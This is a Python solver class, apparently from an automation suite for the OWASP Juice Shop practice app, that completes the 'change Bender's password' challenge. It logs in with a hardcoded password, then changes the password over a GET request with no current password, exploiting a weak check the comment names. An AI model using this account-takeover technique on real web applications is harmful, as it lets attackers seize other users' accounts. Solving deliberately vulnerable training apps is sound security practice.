from core.base_solver import BaseSolver
from loguru import logger

class ChangeBenderPasswordSolver(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "changePasswordBenderChallenge"

    def solve(self) -> bool:
        # 1. Login as bender
        login_res = self.client.post("/rest/user/login", json={
            "email": "bender@juice-sh.op", 
            "password": "OhG0dPlease1nsertLiquor!"
        })
        token = login_res.json().get("authentication", {}).get("token")
        if not token: return False
        
        headers = {"Authorization": f"Bearer {token}"}
        
        # 2. Change password WITHOUT current password
        # This exploits the 'if (currentPassword && ...)' check in routes/changePassword.ts
        params = {
            "new": "slurmCl4ssic",
            "repeat": "slurmCl4ssic"
        }
        res = self.client.get("/rest/user/change-password", params=params, headers=headers)
        return res.status_code == 200
